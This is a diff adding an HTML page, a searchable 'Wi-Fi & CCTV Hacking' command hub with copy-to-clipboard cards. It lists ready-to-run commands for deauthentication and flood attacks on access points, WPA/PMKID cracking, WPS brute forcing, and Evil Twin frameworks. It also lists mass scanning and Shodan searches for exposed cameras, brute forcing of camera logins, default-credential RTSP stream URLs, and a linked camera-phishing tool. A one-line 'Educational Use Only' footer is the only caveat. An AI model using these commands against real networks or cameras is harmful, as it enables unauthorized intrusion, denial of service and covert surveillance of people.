@@ -1,0 +1,624 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ultimate Wi-Fi & CCTV Hacking Command Hub</title>
+    <style>
+        :root {
+            --bg: #f4f6f8;
+            --card-bg: #ffffff;
+            --text-main: #2c3e50;
+            --text-secondary: #7f8c8d;
+            --primary: #8e44ad; /* Purple for WiFi/Radio vibe */
+            --accent: #e74c3c;
+            --border: #dcdde1;
+            --code-bg: #2f3640;
+            --code-text: #00d2d3;
+            --shadow: 0 4px 6px rgba(0,0,0,0.05);
+            --font-main: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            --font-mono: 'Consolas', 'Monaco', 'Courier New', monospace;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+
+        body {
+            background-color: var(--bg);
+            color: var(--text-main);
+            font-family: var(--font-main);
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        /* Header */
+        header {
+            background: #fff;
+            padding: 3rem 1rem;
+            text-align: center;
+            border-bottom: 1px solid var(--border);
+            box-shadow: 0 2px 15px rgba(0,0,0,0.03);
+        }
+
+        h1 { font-size: 2.5rem; margin-bottom: 0.5rem; color: var(--text-main); font-weight: 800; }
+        h1 span { color: var(--primary); }
+        .subtitle { color: var(--text-secondary); font-size: 1.1rem; }
+
+        /* Controls */
+        .controls {
+            background: #fff;
+            padding: 1.5rem;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            border-bottom: 1px solid var(--border);
+            box-shadow: 0 4px 10px -6px rgba(0,0,0,0.1);
+        }
+
+        .search-box {
+            max-width: 800px;
+            margin: 0 auto 1rem auto;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 1rem 1.5rem;
+            border: 2px solid var(--border);
+            border-radius: 50px;
+            font-size: 1rem;
+            outline: none;
+            transition: 0.3s;
+            background: var(--bg);
+        }
+
+        input[type="text"]:focus {
+            border-color: var(--primary);
+            background: #fff;
+            box-shadow: 0 0 0 4px rgba(142, 68, 173, 0.15);
+        }
+
+        .filters {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 0.8rem;
+        }
+
+        .filter-btn {
+            background: transparent;
+            border: 1px solid var(--border);
+            color: var(--text-secondary);
+            padding: 0.6rem 1.2rem;
+            border-radius: 30px;
+            cursor: pointer;
+            font-size: 0.9rem;
+            font-weight: 600;
+            transition: all 0.2s;
+        }
+
+        .filter-btn:hover { background: #f1f2f6; color: var(--text-main); }
+        
+        .filter-btn.active {
+            background: var(--text-main);
+            color: #fff;
+            border-color: var(--text-main);
+            box-shadow: 0 4px 12px rgba(44, 62, 80, 0.3);
+        }
+
+        /* Grid */
+        main {
+            flex: 1;
+            padding: 2rem;
+            max-width: 1600px;
+            margin: 0 auto;
+            width: 100%;
+        }
+
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(380px, 1fr));
+            gap: 1.5rem;
+        }
+
+        .card {
+            background: var(--card-bg);
+            border-radius: 12px;
+            border: 1px solid var(--border);
+            padding: 1.5rem;
+            display: flex;
+            flex-direction: column;
+            transition: transform 0.2s, box-shadow 0.2s;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .card:hover {
+            transform: translateY(-5px);
+            box-shadow: var(--shadow);
+            border-color: #bdc3c7;
+        }
+
+        .card::before {
+            content: '';
+            position: absolute;
+            left: 0; top: 0; bottom: 0;
+            width: 5px;
+            background: #bdc3c7;
+        }
+
+        .card-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            margin-bottom: 0.8rem;
+        }
+
+        .tool-name {
+            font-weight: 700;
+            font-size: 1.15rem;
+            color: var(--text-main);
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .tag {
+            font-size: 0.7rem;
+            padding: 4px 8px;
+            border-radius: 6px;
+            background: #eee;
+            color: #666;
+            font-weight: 700;
+            text-transform: uppercase;
+        }
+
+        .desc {
+            font-size: 0.9rem;
+            color: var(--text-secondary);
+            margin-bottom: 1.2rem;
+            line-height: 1.5;
+            flex-grow: 1;
+        }
+
+        /* Code Box */
+        .code-box {
+            background: var(--code-bg);
+            border-radius: 8px;
+            padding: 1rem;
+            position: relative;
+            cursor: pointer;
+            transition: 0.2s;
+            border: 1px solid transparent;
+        }
+
+        .code-box:hover { 
+            border-color: var(--primary); 
+            box-shadow: 0 4px 12px rgba(0,0,0,0.2); 
+        }
+
+        .code-text {
+            font-family: var(--font-mono);
+            font-size: 0.85rem;
+            color: var(--code-text);
+            word-break: break-all;
+            display: block;
+            margin-right: 20px;
+        }
+
+        .copy-icon {
+            position: absolute;
+            top: 50%; right: 10px;
+            transform: translateY(-50%);
+            color: rgba(255,255,255,0.3);
+            font-size: 1rem;
+        }
+        .code-box:hover .copy-icon { color: #fff; }
+
+        /* Links */
+        .link-btn {
+            display: inline-block;
+            margin-top: 10px;
+            font-size: 0.8rem;
+            text-decoration: none;
+            color: var(--text-main);
+            border: 1px solid var(--border);
+            padding: 5px 10px;
+            border-radius: 4px;
+            text-align: center;
+        }
+        .link-btn:hover { background: #f1f2f6; }
+
+        /* Toast */
+        .toast {
+            position: fixed;
+            bottom: 30px; right: 30px;
+            background: var(--text-main);
+            color: #fff;
+            padding: 12px 24px;
+            border-radius: 50px;
+            font-weight: 600;
+            transform: translateY(200%);
+            transition: 0.3s;
+            z-index: 2000;
+            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
+        }
+        .toast.show { transform: translateY(0); }
+
+        footer {
+            text-align: center;
+            padding: 3rem;
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+            background: #fff;
+            border-top: 1px solid var(--border);
+        }
+
+        /* Specific Colors */
+        .cat-wifi .tag { background: #f3e5f5; color: #8e44ad; }
+        .cat-wifi::before { background: #8e44ad; }
+
+        .cat-cctv .tag { background: #e0f2f1; color: #009688; }
+        .cat-cctv::before { background: #009688; }
+
+        .cat-nmap .tag { background: #ffebee; color: #c0392b; }
+        .cat-nmap::before { background: #c0392b; }
+
+        .cat-github .tag { background: #eceff1; color: #2d3436; }
+        .cat-github::before { background: #2d3436; }
+
+        @media (max-width: 768px) {
+            .grid { grid-template-columns: 1fr; }
+            .filters { flex-wrap: nowrap; overflow-x: auto; justify-content: flex-start; }
+            h1 { font-size: 1.8rem; }
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <h1>📶 Wi-Fi & CCTV <span>Hacking</span> Hub</h1>
+        <p class="subtitle">Complete Command Reference: WPA, WPS, PMKID, RTSP & IoT Exploitation</p>
+    </header>
+
+    <div class="controls">
+        <div class="search-box">
+            <input type="text" id="searchInput" placeholder="Search (e.g., handshake, rtsp, reaver, deauth, camera, monitor)...">
+        </div>
+        <div class="filters" id="filters">
+            <button class="filter-btn active" data-filter="all">All Tools</button>
+            <button class="filter-btn" data-filter="wifi">Wi-Fi Attacks</button>
+            <button class="filter-btn" data-filter="cctv">CCTV / IoT</button>
+            <button class="filter-btn" data-filter="nmap">Nmap</button>
+            <button class="filter-btn" data-filter="github">GitHub Tools</button>
+        </div>
+    </div>
+
+    <main>
+        <div class="grid" id="grid">
+            <!-- Content Injected Here -->
+        </div>
+    </main>
+
+    <div id="toast" class="toast">✅ Command Copied!</div>
+
+    <footer>
+        <p><strong>⚠️ Educational Use Only</strong><br>Scanning or attacking networks/cameras without permission is illegal.</p>
+    </footer>
+
+    <script>
+        const tools = [
+            /* =========================================
+               WI-FI HACKING (COMPLETE KILL CHAIN)
+            ========================================= */
+            // --- MONITOR MODE & PREP ---
+            {
+                name: "Airmon-ng: Start Monitor",
+                cat: "wifi",
+                desc: "Enable monitor mode to capture packets. (Kill processes first if needed).",
+                usage: "sudo airmon-ng start wlan0"
+            },
+            {
+                name: "Airmon-ng: Check Kill",
+                cat: "wifi",
+                desc: "Kill interfering processes (NetworkManager, wpa_supplicant) before starting.",
+                usage: "sudo airmon-ng check kill"
+            },
+            {
+                name: "Iwconfig",
+                cat: "wifi",
+                desc: "Check wireless interface mode (Managed vs Monitor).",
+                usage: "iwconfig"
+            },
+            {
+                name: "MAC Changer",
+                cat: "wifi",
+                desc: "Spoof your MAC address to stay anonymous.",
+                usage: "sudo macchanger -r wlan0"
+            },
+
+            // --- SCANNING & DISCOVERY ---
+            {
+                name: "Airodump-ng: Scan All",
+                cat: "wifi",
+                desc: "Scan for all APs and Clients in range on 2.4GHz & 5GHz.",
+                usage: "sudo airodump-ng wlan0mon"
+            },
+            {
+                name: "Airodump-ng: Target Specific",
+                cat: "wifi",
+                desc: "Focus capture on one BSSID and Channel to catch handshake.",
+                usage: "sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon"
+            },
+            {
+                name: "Wash (WPS Scan)",
+                cat: "wifi",
+                desc: "Scan for networks with WPS enabled (Locked/Unlocked).",
+                usage: "sudo wash -i wlan0mon"
+            },
+            {
+                name: "Kismet",
+                cat: "wifi",
+                desc: "Passive wireless sniffer, IDS, and wardriving tool (Web UI).",
+                usage: "sudo kismet -c wlan0mon"
+            },
+
+            // --- ATTACKS (DEAUTH / DOS) ---
+            {
+                name: "Aireplay-ng: Deauth (Specific)",
+                cat: "wifi",
+                desc: "Kick a specific client off the network to force reconnection (Handshake).",
+                usage: "sudo aireplay-ng --deauth 10 -a [BSSID] -c [CLIENT_MAC] wlan0mon"
+            },
+            {
+                name: "Aireplay-ng: Deauth (Global)",
+                cat: "wifi",
+                desc: "Kick EVERYONE off a specific Access Point.",
+                usage: "sudo aireplay-ng --deauth 0 -a [BSSID] wlan0mon"
+            },
+            {
+                name: "MDK3: Beacon Flood",
+                cat: "wifi",
+                desc: "Spam fake APs to confuse scanners and crash drivers.",
+                usage: "sudo mdk3 wlan0mon b -n 'FakeAP'"
+            },
+            {
+                name: "MDK3: Auth Flood",
+                cat: "wifi",
+                desc: "Flood AP with authentication requests to freeze it.",
+                usage: "sudo mdk3 wlan0mon a -a [BSSID]"
+            },
+
+            // --- CRACKING (WPA/WPS) ---
+            {
+                name: "Aircrack-ng: Crack WPA",
+                cat: "wifi",
+                desc: "Brute force a captured WPA handshake using a wordlist.",
+                usage: "aircrack-ng -w /usr/share/wordlists/rockyou.txt capture.cap"
+            },
+            {
+                name: "Hashcat: WPA Crack (GPU)",
+                cat: "wifi",
+                desc: "Crack WPA/WPA2 (converted to hccapx) using GPU. (Mode 2500).",
+                usage: "hashcat -m 2500 capture.hccapx rockyou.txt"
+            },
+            {
+                name: "Reaver (WPS Attack)",
+                cat: "wifi",
+                desc: "Brute force WPS PIN to recover password (Online attack).",
+                usage: "reaver -i wlan0mon -b [BSSID] -vv -L"
+            },
+            {
+                name: "Bully (WPS)",
+                cat: "wifi",
+                desc: "Alternative to Reaver for WPS brute forcing (Written in C).",
+                usage: "bully -b [BSSID] -c 6 -v 3 wlan0mon"
+            },
+            {
+                name: "PixieWPS",
+                cat: "wifi",
+                desc: "Offline WPS brute force (Pixie Dust Attack) if router is vulnerable.",
+                usage: "pixiewps -e [PKE] -r [PKR] -s [E-Hash1] -z [E-Hash2]"
+            },
+
+            // --- ADVANCED (PMKID / EVIL TWIN) ---
+            {
+                name: "Hcxdumptool (PMKID)",
+                cat: "wifi",
+                desc: "Client-less attack. Capture PMKID from AP (WPA2).",
+                usage: "sudo hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1"
+            },
+            {
+                name: "Hcxpcapngtool",
+                cat: "wifi",
+                desc: "Convert pcapng to hash file for Hashcat (Mode 22000).",
+                usage: "hcxpcapngtool -o hash.22000 capture.pcapng"
+            },
+            {
+                name: "Wifite2",
+                cat: "wifi",
+                desc: "Automated auditing tool. Runs all above attacks sequentially.",
+                usage: "sudo wifite --kill"
+            },
+            {
+                name: "Bettercap (WiFi)",
+                cat: "wifi",
+                desc: "Start Bettercap in WiFi reconnaissance mode.",
+                usage: "sudo bettercap -iface wlan0"
+            },
+            {
+                name: "Fluxion / Airgeddon",
+                cat: "wifi",
+                desc: "Launch menu-driven Evil Twin framework.",
+                usage: "sudo ./fluxion.sh"
+            },
+
+            /* =========================================
+               CCTV & IOT CAMERA HACKING
+            ========================================= */
+            // --- DISCOVERY ---
+            {
+                name: "Nmap: RTSP Discovery",
+                cat: "cctv",
+                desc: "Scan for port 554 (Real Time Streaming Protocol) used by cameras.",
+                usage: "nmap -p 554 --open 192.168.1.0/24"
+            },
+            {
+                name: "Nmap: RTSP Script",
+                cat: "cctv",
+                desc: "Enumerate RTSP methods and paths using NSE.",
+                usage: "nmap --script rtsp-methods -p 554 [IP]"
+            },
+            {
+                name: "Masscan (Large Scale)",
+                cat: "cctv",
+                desc: "Scan large subnets for camera ports (80, 8080, 554, 37777).",
+                usage: "masscan -p80,8000,8080,554 10.0.0.0/8"
+            },
+            {
+                name: "Shodan CLI: Webcams",
+                cat: "cctv",
+                desc: "Search Shodan for 'webcamxp' headers.",
+                usage: "shodan search \"webcamxp\""
+            },
+            {
+                name: "Shodan CLI: RTSP",
+                cat: "cctv",
+                desc: "Search Shodan for open RTSP streams (port 554).",
+                usage: "shodan search port:554 has_screenshot:true"
+            },
+
+            // --- ATTACK & ACCESS ---
+            {
+                name: "Hydra: RTSP Brute",
+                cat: "cctv",
+                desc: "Brute force RTSP login credentials.",
+                usage: "hydra -l admin -P passwords.txt rtsp://[IP]"
+            },
+            {
+                name: "Medusa: HTTP Brute",
+                cat: "cctv",
+                desc: "Brute force camera web interface (HTTP).",
+                usage: "medusa -h [IP] -u admin -P pass.txt -M http"
+            },
+            {
+                name: "Cameradar",
+                cat: "cctv",
+                desc: "Access RTSP streams and guess routes.",
+                usage: "cameradar -t [IP] -p 554"
+            },
+            {
+                name: "Routersploit",
+                cat: "cctv",
+                desc: "Framework to exploit router/camera vulnerabilities.",
+                usage: "python3 rsf.py"
+            },
+            {
+                name: "VLC Stream Play",
+                cat: "cctv",
+                desc: "Command to play RTSP stream directly in VLC.",
+                usage: "vlc rtsp://admin:password@[IP]:554/live"
+            },
+            {
+                name: "RTSP URL Format 1",
+                cat: "cctv",
+                desc: "Common URL pattern for Hikvision/Generic cameras.",
+                usage: "rtsp://admin:12345@[IP]:554/h264/ch1/main/av_stream"
+            },
+            {
+                name: "RTSP URL Format 2",
+                cat: "cctv",
+                desc: "Common URL pattern for Dahua cameras.",
+                usage: "rtsp://admin:admin@[IP]:554/cam/realmonitor?channel=1&subtype=0"
+            },
+
+            /* =========================================
+               NMAP & GITHUB (Summarized for context)
+            ========================================= */
+            { name: "Nmap: Stealth", cat: "nmap", desc: "SYN Scan.", usage: "nmap -sS [IP]" },
+            { name: "Nmap: OS Detect", cat: "nmap", desc: "OS Fingerprint.", usage: "nmap -O [IP]" },
+            { name: "Nmap: Vuln", cat: "nmap", desc: "Vuln Scripts.", usage: "nmap --script vuln [IP]" },
+            { name: "Sherlock", cat: "github", desc: "Social Media Hunt.", usage: "python3 sherlock.py user", link: "https://github.com/sherlock-project/sherlock" },
+            { name: "CamPhish", cat: "github", desc: "Phishing Camera.", usage: "./camphish.sh", link: "https://github.com/techchipnet/CamPhish" }
+        ];
+
+        // --- Logic ---
+        const grid = document.getElementById('grid');
+        const searchInput = document.getElementById('searchInput');
+        const filters = document.querySelectorAll('.filter-btn');
+        const toast = document.getElementById('toast');
+        let activeFilter = 'all';
+
+        render(tools);
+
+        filters.forEach(btn => {
+            btn.addEventListener('click', () => {
+                filters.forEach(b => b.classList.remove('active'));
+                btn.classList.add('active');
+                activeFilter = btn.getAttribute('data-filter');
+                filterItems();
+            });
+        });
+
+        searchInput.addEventListener('input', filterItems);
+
+        function filterItems() {
+            const term = searchInput.value.toLowerCase().trim();
+            const filtered = tools.filter(item => {
+                const matchesCat = activeFilter === 'all' || item.cat === activeFilter;
+                const matchesText = item.name.toLowerCase().includes(term) || 
+                                    item.desc.toLowerCase().includes(term) ||
+                                    item.usage.toLowerCase().includes(term);
+                return matchesCat && matchesText;
+            });
+            render(filtered);
+        }
+
+        function render(items) {
+            grid.innerHTML = '';
+            
+            if(items.length === 0) {
+                grid.innerHTML = `<div style="grid-column: 1/-1; text-align: center; padding: 2rem; color: #999;"><h3>No tools found.</h3></div>`;
+                return;
+            }
+
+            items.forEach(item => {
+                const div = document.createElement('div');
+                div.className = `card cat-${item.cat}`;
+                
+                let icon = '🔧';
+                if(item.cat === 'wifi') icon = '📶';
+                if(item.cat === 'cctv') icon = '📹';
+                if(item.cat === 'nmap') icon = '📡';
+                if(item.cat === 'github') icon = '📦';
+
+                const linkHtml = item.link ? `<a href="${item.link}" target="_blank" class="link-btn">View on GitHub ↗</a>` : '';
+
+                div.innerHTML = `
+                    <div class="card-header">
+                        <div class="tool-name">${icon} ${item.name}</div>
+                        <span class="tag">${item.cat.toUpperCase()}</span>
+                    </div>
+                    <div class="desc">${item.desc}</div>
+                    <div class="code-box" onclick="copy('${item.usage.replace(/'/g, "\\'")}')">
+                        <code class="code-text">$ ${item.usage}</code>
+                        <span class="copy-icon">📋</span>
+                    </div>
+                    ${linkHtml}
+                `;
+                grid.appendChild(div);
+            });
+        }
+
+        function copy(text) {
+            const ta = document.createElement('textarea');
+            ta.value = text;
+            document.body.appendChild(ta);
+            ta.select();
+            document.execCommand('copy');
+            document.body.removeChild(ta);
+            toast.classList.add('show');
+            setTimeout(() => toast.classList.remove('show'), 2000);
+        }
+    </script>
+</body>
+</html>
